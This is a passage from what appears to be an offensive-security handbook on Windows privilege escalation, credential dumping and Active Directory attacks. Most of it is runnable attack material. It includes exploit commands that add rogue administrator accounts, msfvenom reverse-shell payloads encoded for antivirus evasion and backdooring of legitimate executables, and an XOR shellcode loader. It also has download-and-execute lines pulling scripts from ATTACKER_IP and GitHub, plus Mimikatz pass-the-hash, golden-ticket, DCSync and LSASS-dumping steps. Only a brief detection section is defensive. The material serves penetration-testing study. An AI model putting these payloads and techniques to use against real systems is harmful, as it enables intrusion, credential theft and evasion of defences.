set LPORT 4445

# Check if vulnerable
check

# Exploit
exploit
```

#### Manual Vulnerability Research

**Search exploit-db:**

```bash
# Search by OS version
searchsploit Windows Server 2016

# Search by CVE
searchsploit CVE-2021-1675

# Search for privilege escalation
searchsploit Windows privilege escalation

# Copy exploit to current directory
searchsploit -m windows/local/39719.ps1
```

**GitHub exploit search:**

```bash
# Clone common privilege escalation repository
git clone https://github.com/SecWiki/windows-kernel-exploits.git

# Browse by vulnerability
cd windows-kernel-exploits
ls -la
```

#### Common Windows Kernel Exploits

**MS16-032 (Secondary Logon Handle):**

```powershell
# Download exploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1')

# Execute
Invoke-MS16032 -Command "cmd.exe /c net user hacker Passw0rd! /add && net localgroup administrators hacker /add"

# Alternative: Get SYSTEM shell
Invoke-MS16032 -Command "powershell -ep bypass"
```

**MS16-075 (SMB Server Type Confusion):**

```powershell
# Download exploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/40085.ps1')

# Execute
Invoke-MS16075
```

**MS15-051 (Client Copy Image):**

```cmd
REM Compile exploit or download binary
ms15-051x64.exe whoami

REM Get SYSTEM shell
ms15-051x64.exe "cmd.exe"
```

**PrintNightmare (CVE-2021-1675):**

```powershell
# Download exploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1')

# Add user with admin privileges
Invoke-Nightmare -NewUser "hacker" -NewPassword "Passw0rd!"

# Verify
net user hacker
net localgroup administrators
```

[Unverified] Exploit availability and functionality depend on target patch level, architecture, and security configurations; exploits may fail or require modification.

### Metasploit Payload Encoding

#### Understanding Payload Encoding

Payload encoding transforms shellcode to evade detection by:

- Removing bad characters (null bytes, carriage returns)
- Obfuscating signature-based detection
- Bypassing basic antivirus scanning

**Important note:** Modern antivirus uses behavioral detection and heuristics, so encoding alone is often insufficient.

#### Msfvenom Encoding Options

**Basic encoding syntax:**

```bash
msfvenom -p PAYLOAD -e ENCODER -i ITERATIONS [OPTIONS]
```

**Available encoders:**

```bash
# List all encoders
msfvenom --list encoders

# Common encoders:
# x86/shikata_ga_nai - Polymorphic XOR additive feedback
# x64/zutto_dekiru - 64-bit polymorphic XOR
# cmd/powershell_base64 - Base64 encoding for PowerShell
# x86/call4_dword_xor - XOR encoding
# x86/countdown - Single-byte XOR countdown
```

**Encoder ranking:**

```
Rank   Encoder
----   -------
excellent  cmd/powershell_base64
excellent  x86/shikata_ga_nai
excellent  x64/zutto_dekiru
great      x86/call4_dword_xor
good       x86/jmp_call_additive
normal     x86/countdown
```

#### Single Encoding Examples

**x86/shikata_ga_nai encoder:**

```bash
# Basic encoding
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe

# With iterations (more obfuscation)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

# 64-bit version
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o payload.exe
```

**PowerShell base64 encoding:**

```bash
# Encode PowerShell command
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e cmd/powershell_base64 -o payload.ps1

# Output is base64-encoded PowerShell
# Execute with: powershell -EncodedCommand [BASE64_STRING]
```

#### Multiple Encoding (Chaining Encoders)

**Pipe encoders together:**

```bash
# Double encoding
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 3 | msfvenom -e x86/alpha_mixed -a x86 --platform windows -f exe -o payload.exe

# Note: Multiple encoding increases size significantly
```

[Inference] Chaining multiple encoders creates larger payloads and may not significantly improve evasion against modern AV; consider other evasion techniques instead.

#### Removing Bad Characters

**Specify bad characters:**

```bash
# Remove null bytes and newlines
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f exe -o payload.exe

# Remove multiple bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\x00\x0a\x0d\xff' -f c
```

#### Template Injection

**Inject payload into legitimate executable:**

```bash
# Use template (sign legitimate binary)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x calc.exe -k -f exe -o calc_backdoor.exe

# -x: Template executable
# -k: Keep template behavior (process continues normally)
```

**Custom template:**

```bash
# Create custom template with specific certificate
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x legitimate_signed.exe -k -f exe -o backdoored.exe
```

#### Format-Specific Encoding

**Generate in different formats:**

```bash
# C language shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c

# Python format
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f py

# PowerShell format
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh

# VBA macro
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f vba

# DLL format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o payload.dll
```

#### Custom Encoding Script

**Manually encode shellcode:**

```python
#!/usr/bin/env python3
import sys

def xor_encode(shellcode, key):
    encoded = bytearray()
    for byte in shellcode:
        encoded.append(byte ^ key)
    return bytes(encoded)

def generate_payload(encoded_shellcode, key):
    payload = f"""
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {{
{', '.join(f'0x{b:02x}' for b in encoded_shellcode)}
}};

int main() {{
    // Decode shellcode
    for (int i = 0; i < sizeof(shellcode); i++) {{
        shellcode[i] ^= 0x{key:02x};
    }}
    
    // Execute
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    
    return 0;
}}
"""
    return payload

# Read raw shellcode
with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

# Encode with XOR
key = 0xAA
encoded = xor_encode(shellcode, key)

# Generate C code
payload = generate_payload(encoded, key)
print(payload)

# Save to file
with open('payload.c', 'w') as f:
    f.write(payload)
```

**Usage:**

```bash
# Generate raw shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shellcode.bin

# Encode it
python3 custom_encoder.py shellcode.bin

# Compile
i686-w64-mingw32-gcc payload.c -o payload.exe
```

#### Metasploit Handler Setup

**Setup listener for encoded payloads:**

```bash
msfconsole -q

# Use exploit handler
use exploit/multi/handler

# Set payload (must match generated payload)
set PAYLOAD windows/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444

# For meterpreter
set PAYLOAD windows/meterpreter/reverse_tcp

# Handle multiple sessions
set ExitOnSession false

# Run in background
exploit -j -z
```

### Mimikatz (Credential Dumping)

#### Understanding Mimikatz

Mimikatz extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. It exploits Windows authentication mechanisms to dump credentials from LSASS (Local Security Authority Subsystem Service).

**Key capabilities:**

- Dump LSASS memory (passwords, hashes, tickets)
- Pass-the-Hash attacks
- Pass-the-Ticket attacks
- Golden Ticket generation
- Kerberos ticket manipulation
- LSA secrets extraction
- SAM database dumping

#### Mimikatz Execution Methods

**Direct execution (requires SYSTEM/Admin):**

```cmd
REM Run mimikatz
mimikatz.exe

REM Execute commands and exit
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

REM Run from PowerShell
.\mimikatz.exe
```

**PowerShell version (Invoke-Mimikatz):**

```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Execute
Invoke-Mimikatz

# Dump to file
Invoke-Mimikatz -DumpCreds | Out-File creds.txt

# Specific computer
Invoke-Mimikatz -ComputerName TARGET_HOST
```

[Unverified] Invoke-Mimikatz may be detected by AMSI (Antimalware Scan Interface) on modern Windows systems; obfuscation or AMSI bypass may be required.

#### Basic Mimikatz Commands

**Enable debug privilege:**

```
mimikatz # privilege::debug
Privilege '20' OK
```

**Dump logon passwords:**

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : WORKGROUP
Logon Server      : DESKTOP-PC
Logon Time        : 10/11/2024 10:30:00 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-PC
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : d5934f4cd8xxxxxxxxxxxxxxxxxxxxxx
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-PC
         * Password : P@ssw0rd123!
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-PC
         * Password : P@ssw0rd123!
```

**Output explanation:**

- `NTLM` - NTLM hash (for Pass-the-Hash)
- `Password` - Plaintext password (if WDigest enabled)
- `kerberos` - Kerberos tickets and credentials

#### Credential Dumping Commands

**Dump all credentials:**

```
mimikatz # sekurlsa::logonpasswords full
```

**Dump specific authentication package:**

```
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::livessp
```

**Dump credential manager:**

```
mimikatz # sekurlsa::credman
```

**List all available credentials:**

```
mimikatz # sekurlsa::ekeys
```

#### SAM Database Dumping

**Extract SAM hashes:**

```
mimikatz # lsadump::sam

Domain : DESKTOP-PC
SysKey : 1234567890abcdef1234567890abcdef

Local Users:
  Administrator
    RID  : 000001f4 (500)
    User : Administrator
    LM   : 
    NTLM : a87f3a337d73085c45f9416be5787d86

  Guest
    RID  : 000001f5 (501)
    User : Guest
    NTLM :
```

**Extract from registry:**

```cmd
REM Save registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

REM In mimikatz
mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```

#### LSA Secrets Extraction

**Dump LSA secrets:**

```
mimikatz # lsadump::secrets

Domain : DESKTOP-PC

Policy subsystem is : 1.18

Local name : DESKTOP-PC ( S-1-5-21-... )
Domain name : WORKGROUP

Secret  : DefaultPassword
cur/text: MyP@ssw0rd!

Secret  : $MACHINE.ACC
cur/hex : a1b2c3d4...

Secret  : DPAPI_SYSTEM
cur/hex : 01000000d08...
```

#### Pass-the-Hash Attacks

**Execute command with hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:a87f3a337d73085c45f9416be5787d86 /run:cmd.exe
```

**Launch PowerShell with hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:a87f3a337d73085c45f9416be5787d86 /run:powershell.exe
```

**Remote execution:**

```powershell
# In spawned cmd/PowerShell with injected hash
psexec.exe \\TARGET_HOST cmd.exe

# Or use built-in tools
net use \\TARGET_HOST\C$ /user:DOMAIN\Administrator

# Map drive
net use Z: \\TARGET_HOST\C$
```

#### Kerberos Ticket Manipulation

**List Kerberos tickets:**

```
mimikatz # sekurlsa::tickets
```

**Export tickets:**

```
mimikatz # sekurlsa::tickets /export

REM Saves .kirbi files to disk
```

**Pass-the-Ticket attack:**

```
mimikatz # kerberos::ptt ticket.kirbi

REM Or inject multiple tickets
mimikatz # kerberos::ptt /directory:C:\tickets
```

**Golden Ticket generation:**

```
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt

REM Parameters:
REM /user: Target username
REM /domain: Domain FQDN
REM /sid: Domain SID (without RID)
REM /krbtgt: KRBTGT account NTLM hash
REM /id: User RID (500 = Administrator)
REM /ptt: Pass-the-Ticket (inject immediately)
```

**Silver Ticket generation:**

```
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt
```

#### DCSync Attack

**Replicate domain credentials:**

```
mimikatz # lsadump::dcsync /user:DOMAIN\Administrator
mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

**Output:**

```
Object RDN           : Administrator

** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWORD )
Object Security ID   : S-1-5-21-...-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a87f3a337d73085c45f9416be5787d86
```

[Inference] DCSync requires Replication Directory Changes permissions (Domain Admins, Enterprise Admins, or explicitly granted); detection is possible through event log monitoring.

#### Advanced Mimikatz Features

**Enable WDigest (force plaintext passwords):**

```
mimikatz # misc::memssp

REM Or via registry
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

REM Force user to re-authenticate (lock screen and unlock)
```

**Dump DPAPI master keys:**

```
mimikatz # sekurlsa::dpapi
```

**Extract private keys:**

```
mimikatz # crypto::capi
mimikatz # crypto::cng
```

**Dump certificates:**

```
mimikatz # crypto::certificates /export
```

#### Evasion Techniques

**Obfuscated Invoke-Mimikatz:**

```powershell
# Download obfuscated version
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz-Obfuscated.ps1')

# Rename function
${I`NvoKe-mI`miK`Atz}

# Use variable indirection
$cmd = "Invoke-Mimikatz"
& $cmd
```

**Dump LSASS without Mimikatz:**

```powershell
# Using Task Manager (GUI)
# Right-click lsass.exe -> Create dump file

# Using procdump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp

# Using comsvcs.dll (built-in)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Parse dump offline with mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Use pypykatz (Python alternative):**

```bash
# Install pypykatz
pip3 install pypykatz

# Parse LSASS dump
pypykatz lsa minidump lsass.dmp

# Live parsing (requires admin)
pypykatz lsa live
```

#### Remote Credential Dumping

**Remote mimikatz execution:**

```powershell
# PsExec
psexec.exe \\TARGET_HOST -s cmd.exe
# Then run mimikatz

# WinRM
$session = New-PSSession -ComputerName TARGET_HOST -Credential $cred
Invoke-Command -Session $session -FilePath .\Invoke-Mimikatz.ps1
Invoke-Command -Session $session -ScriptBlock { Invoke-Mimikatz }

# WMI
wmic /node:TARGET_HOST /user:Administrator process call create "cmd.exe /c mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\output.txt"
```

#### Metasploit Mimikatz Integration

**Within Meterpreter session:**

```bash
# Load kiwi extension (mimikatz)
load kiwi

# Dump credentials
creds_all

# Specific dumps
creds_msv
creds_kerberos
creds_wdigest

# LSA secrets
lsa_dump_secrets

# SAM dump
lsa_dump_sam

# Pass-the-hash
kiwi_cmd sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Defense and Detection

#### Detecting Credential Dumping

**Monitor for LSASS access:**

```powershell
# Check for LSASS dump files
Get-ChildItem C:\ -Recurse -Include "lsass*.dmp" -ErrorAction SilentlyContinue

# Monitor LSASS process access
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4656} | 
    Where-Object { $_.Message -match "lsass.exe" }

# Sysmon Event ID 10 (Process Access)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 10 -and $_.Message -match "lsass.exe" }
```

#### Credential Guard and Protected Process Light

**Check Credential Guard status:**

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured, DeviceGuardSecurityServicesRunning
```

**Enable Credential Guard (Windows 10/Server 2016+):**

```powershell
# Via Group Policy or registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f

# Requires reboot
```

[Inference] Credential Guard uses virtualization-based security to isolate credentials; Mimikatz cannot extract credentials from Credential Guard-protected systems without kernel-level access.

### Important Related Topics

For complete Windows privilege escalation and credential access, also investigate:

- **NTLM relay attacks** (Responder, ntlmrelayx)
- **Kerberoasting** (GetUserSPNs, rubeus)
- **AS-REP roasting** (Pre-authentication disabled accounts)
- **Token impersonation** (Incognito, Rogue Potato variants)
- **LAPS password extraction** (AdmPwd.PS module)
- **Windows Vault credential extraction** (VaultCmd, Credential Manager)
- **Browser credential dumping** (SharpChrome, LaZagne)
- **Domain trust exploitation** (SID History, trust tickets)

---

## Active Directory Exploitation

### Domain Enumeration (Get-ADUser, Get-ADComputer, Get-ADGroup)

Domain enumeration is the process of gathering information about Active Directory objects, relationships, and configurations to identify attack paths and privilege escalation opportunities.

#### Initial Domain Context

**Verify domain membership:**

```cmd
echo %USERDOMAIN%
echo %LOGONSERVER%
net config workstation
systeminfo | findstr /B /C:"Domain"
```

**PowerShell domain information:**

```powershell
Get-WmiObject Win32_ComputerSystem | Select-Object Domain, DomainRole
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN
```

**Identify domain controllers:**

```cmd
nltest /dclist:%USERDOMAIN%
nslookup -type=SRV _ldap._tcp.dc._msdcs.%USERDOMAIN%
```

**PowerShell domain controller enumeration:**

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem
```

#### Native PowerShell Active Directory Module

**Check if AD module is available:**

```powershell
Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory
```

**If module not available (common on workstations):**

```powershell
# Install RSAT (requires admin)
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

# Alternative: Use LDAP queries or PowerView
```

#### User Enumeration with Get-ADUser

**Basic user enumeration:**

```powershell
# All users
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# All enabled users
Get-ADUser -Filter {Enabled -eq $true} | Select-Object Name, SamAccountName, EmailAddress

# Users with descriptions (often contain passwords)
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null} | Select-Object Name, Description

# Users with password never expires
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | Select-Object Name, PasswordNeverExpires

# Users with password not required
Get-ADUser -Filter {PasswordNotRequired -eq $true} -Properties PasswordNotRequired | Select-Object Name, PasswordNotRequired
```

**Advanced user properties:**

```powershell
# Users with specific properties
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Description, EmailAddress, LastLogonDate, PasswordLastSet, AdminCount, ServicePrincipalNames

# Users who haven't logged in recently (stale accounts)
$date = (Get-Date).AddDays(-90)
Get-ADUser -Filter {LastLogonDate -lt $date} -Properties LastLogonDate | Select-Object Name, LastLogonDate

# Users with AdminCount=1 (protected by AdminSDHolder)
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount | Select-Object Name, SamAccountName
```

**Service Principal Names (SPNs) enumeration:**

```powershell
# Users with SPNs (Kerberoastable accounts)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalNames | Select-Object Name, ServicePrincipalNames

# Detailed SPN information
Get-ADUser -Filter * -Properties ServicePrincipalNames | Where-Object {$_.ServicePrincipalNames} | ForEach-Object {
    [PSCustomObject]@{
        User = $_.SamAccountName
        SPNs = $_.ServicePrincipalNames -join "; "
    }
}
```

**Pre-Windows 2000 compatible access:**

```powershell
# Users readable by Everyone (potential security issue)
Get-ADUser -Filter * -Properties nTSecurityDescriptor | Where-Object {
    $_.nTSecurityDescriptor.Access | Where-Object {
        $_.IdentityReference -eq "Everyone" -and $_.ActiveDirectoryRights -match "ReadProperty"
    }
}
```

**User account control flags:**

```powershell
# Accounts with specific UAC flags
Get-ADUser -Filter * -Properties UserAccountControl | ForEach-Object {
    $uac = $_.UserAccountControl
    if ($uac -band 0x10000) {  # DONT_EXPIRE_PASSWORD
        [PSCustomObject]@{
            Name = $_.Name
            Flag = "Password Never Expires"
        }
    }
    if ($uac -band 0x400000) {  # TRUSTED_FOR_DELEGATION
        [PSCustomObject]@{
            Name = $_.Name
            Flag = "Trusted for Delegation"
        }
    }
    if ($uac -band 0x80000) {  # TRUSTED_TO_AUTH_FOR_DELEGATION
        [PSCustomObject]@{
            Name = $_.Name
            Flag = "Trusted to Auth for Delegation (Constrained)"
        }
    }
}
```

#### Computer Enumeration with Get-ADComputer

**Basic computer enumeration:**

```powershell
# All computers
Get-ADComputer -Filter * | Select-Object Name, DNSHostName, Enabled

# All enabled computers
Get-ADComputer -Filter {Enabled -eq $true} | Select-Object Name, OperatingSystem, OperatingSystemVersion

# Domain controllers
Get-ADComputer -Filter {PrimaryGroupID -eq 516} | Select-Object Name, DNSHostName

# Servers
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} | Select-Object Name, OperatingSystem
```

**Advanced computer properties:**

```powershell
# Computers with detailed information
Get-ADComputer -Filter * -Properties * | Select-Object Name, DNSHostName, OperatingSystem, OperatingSystemVersion, LastLogonDate, IPv4Address, Description

# Computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name, DNSHostName

# Computers with constrained delegation
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null} | Select-Object Name, @{Name="AllowedToDelegate";Expression={$_."msDS-AllowedToDelegateTo"}}
```

**Computer operating system statistics:**

```powershell
# Count by OS
Get-ADComputer -Filter * -Properties OperatingSystem | Group-Object OperatingSystem | Select-Object Count, Name | Sort-Object Count -Descending

# Find potentially vulnerable legacy systems
Get-ADComputer -Filter {OperatingSystem -like "*Windows 7*" -or OperatingSystem -like "*Windows XP*" -or OperatingSystem -like "*Server 2008*"} -Properties OperatingSystem | Select-Object Name, OperatingSystem
```

**Computer lastLogon analysis:**

```powershell
# Inactive computers (no logon in 90 days)
$date = (Get-Date).AddDays(-90)
Get-ADComputer -Filter {LastLogonDate -lt $date} -Properties LastLogonDate | Select-Object Name, LastLogonDate | Sort-Object LastLogonDate
```

#### Group Enumeration with Get-ADGroup

**Basic group enumeration:**

```powershell
# All groups
Get-ADGroup -Filter * | Select-Object Name, GroupScope, GroupCategory

# Security groups only
Get-ADGroup -Filter {GroupCategory -eq "Security"} | Select-Object Name, GroupScope

# Distribution groups
Get-ADGroup -Filter {GroupCategory -eq "Distribution"} | Select-Object Name, GroupScope
```

**Privileged groups:**

```powershell
# Domain Admins
Get-ADGroupMember "Domain Admins" | Select-Object Name, SamAccountName, objectClass

# Enterprise Admins
Get-ADGroupMember "Enterprise Admins" | Select-Object Name, SamAccountName

# Schema Admins
Get-ADGroupMember "Schema Admins" | Select-Object Name, SamAccountName

# Administrators
Get-ADGroupMember "Administrators" | Select-Object Name, SamAccountName

# Backup Operators
Get-ADGroupMember "Backup Operators" | Select-Object Name, SamAccountName

# Account Operators
Get-ADGroupMember "Account Operators" | Select-Object Name, SamAccountName

# Server Operators
Get-ADGroupMember "Server Operators" | Select-Object Name, SamAccountName

# Print Operators
Get-ADGroupMember "Print Operators" | Select-Object Name, SamAccountName
```

**Recursive group membership:**

```powershell
# Get all members recursively (including nested groups)
function Get-ADGroupMemberRecursive {
    param([string]$GroupName)
    
    $members = Get-ADGroupMember $GroupName
    foreach ($member in $members) {
        $member
        if ($member.objectClass -eq "group") {
            Get-ADGroupMemberRecursive -GroupName $member.SamAccountName
        }
    }
}

Get-ADGroupMemberRecursive -GroupName "Domain Admins" | Select-Object Name, SamAccountName, objectClass | Sort-Object -Unique Name
```

**Groups with AdminCount:**

```powershell
# Protected groups (AdminSDHolder)
Get-ADGroup -Filter {AdminCount -eq 1} -Properties AdminCount | Select-Object Name, GroupCategory, GroupScope
```

**Group membership of specific user:**

```powershell
# Get all groups for a user
Get-ADUser "username" -Properties MemberOf | Select-Object -ExpandProperty MemberOf

# Formatted output
Get-ADPrincipalGroupMembership "username" | Select-Object Name, GroupScope, GroupCategory
```

**Empty groups:**

```powershell
# Find groups with no members
Get-ADGroup -Filter * | Where-Object {
    (Get-ADGroupMember $_).Count -eq 0
} | Select-Object Name, GroupScope
```

#### LDAP Query Enumeration (No Module Required)

**PowerShell LDAP queries (works without AD module):**

```powershell
# Set up domain searcher
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domain.PdcRoleOwner.Name
$dn = ([adsi]'').distinguishedName
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$pdc/$dn")

# All users
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object {$_.Properties.samaccountname}

# All computers
$searcher.Filter = "(objectClass=computer)"
$searcher.FindAll() | ForEach-Object {$_.Properties.dnshostname}

# All groups
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll() | ForEach-Object {$_.Properties.samaccountname}

# Users with SPNs
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties.samaccountname
        SPN = $_.Properties.serviceprincipalname
    }
}
```

**Specific LDAP attribute queries:**

```powershell
# Users with description field
$searcher.Filter = "(&(objectClass=user)(description=*))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","description"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties.samaccountname[0]
        Description = $_.Properties.description[0]
    }
}

# Computers with unconstrained delegation
$searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$searcher.FindAll() | ForEach-Object {$_.Properties.dnshostname}

# Users with password never expires
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
$searcher.FindAll() | ForEach-Object {$_.Properties.samaccountname}
```

#### PowerView Enumeration

**PowerView alternative (no AD module required):**

```powershell
# Download and import PowerView
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy
Get-DomainSID

# User enumeration
Get-DomainUser | Select-Object samaccountname, description, pwdlastset, lastlogon
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
Get-DomainUser -AdminCount | Select-Object samaccountname
Get-DomainUser -Properties pwdlastset | Where-Object {$_.pwdlastset -lt (Get-Date).AddYears(-5)}

# Computer enumeration
Get-DomainComputer | Select-Object dnshostname, operatingsystem, lastlogontimestamp
Get-DomainComputer -Unconstrained | Select-Object dnshostname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# Group enumeration
Get-DomainGroup | Select-Object samaccountname
Get-DomainGroupMember "Domain Admins" | Select-Object MemberName
Get-DomainGroup -AdminCount | Select-Object samaccountname
```

**PowerView ACL enumeration:**

```powershell
# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# Objects where specific user has GenericAll
Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Who can modify specific object
Get-DomainObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Select-Object IdentityReferenceName, ActiveDirectoryRights
```

#### Enumeration via net commands

**Legacy enumeration (works on older systems):**

```cmd
rem Domain users
net user /domain

rem Specific user info
net user username /domain

rem Domain groups
net group /domain

rem Specific group members
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

rem Local administrators on current machine
net localgroup administrators

rem Domain computers
net view /domain
net view /domain:DOMAINNAME
```

#### Domain Trust Enumeration

**Trust relationships:**

```powershell
# Get domain trusts
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, TrustAttributes

# Using PowerView
Get-DomainTrust
Get-DomainTrust -Domain external.local

# Forest trusts
Get-ADForest | Select-Object -ExpandProperty Domains
```

**Trust direction interpretation:**

- **Bidirectional** - Two-way trust, users from both domains can access resources
- **Inbound** - External domain trusts this domain
- **Outbound** - This domain trusts external domain

### Bloodhound Analysis

BloodHound uses graph theory to reveal hidden relationships and attack paths in Active Directory environments. It visualizes privilege escalation paths and identifies the shortest route to Domain Admin.

#### BloodHound Architecture

**Components:**

- **SharpHound** - Data collector (C# ingestor)
- **BloodHound** - Analysis GUI (Neo4j-based)
- **Neo4j** - Graph database backend

**Data collected:**

- User and computer objects
- Group memberships
- Local administrator privileges
- Session information
- ACLs and permissions
- Trusts and relationships

#### Installing BloodHound

**On attacker machine (Kali Linux):**

```bash
# Install Neo4j
sudo apt install neo4j bloodhound

# Start Neo4j
sudo neo4j console

# Access Neo4j browser
# http://localhost:7474
# Default credentials: neo4j:neo4j (change on first login)

# Start BloodHound
bloodhound
```

**Alternative - Docker installation:**

```bash
# Run Neo4j in Docker
docker run -d -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j:latest

# Download BloodHound
